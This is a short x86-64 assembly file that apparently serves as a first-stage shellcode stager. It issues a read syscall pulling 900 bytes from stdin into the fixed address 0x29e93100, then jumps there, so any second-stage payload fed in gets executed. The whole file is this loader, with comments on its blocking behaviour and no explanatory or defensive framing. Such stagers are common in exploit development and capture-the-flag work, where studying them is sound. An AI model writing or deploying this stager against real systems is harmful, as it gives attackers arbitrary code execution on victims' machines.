BITS 64
section .text
global _start
_start:
    ; Read Stage2 from stdin (this will BLOCK waiting for input)
    xor eax, eax        ; sys_read = 0
    xor edi, edi        ; fd = 0 (stdin)
    mov esi, 0x29e93100 ; destination
    mov edx, 900      ; size
    syscall             ; This BLOCKS until data is available
    
    ; Jump to Stage2
    mov eax, 0x29e93100
    jmp rax
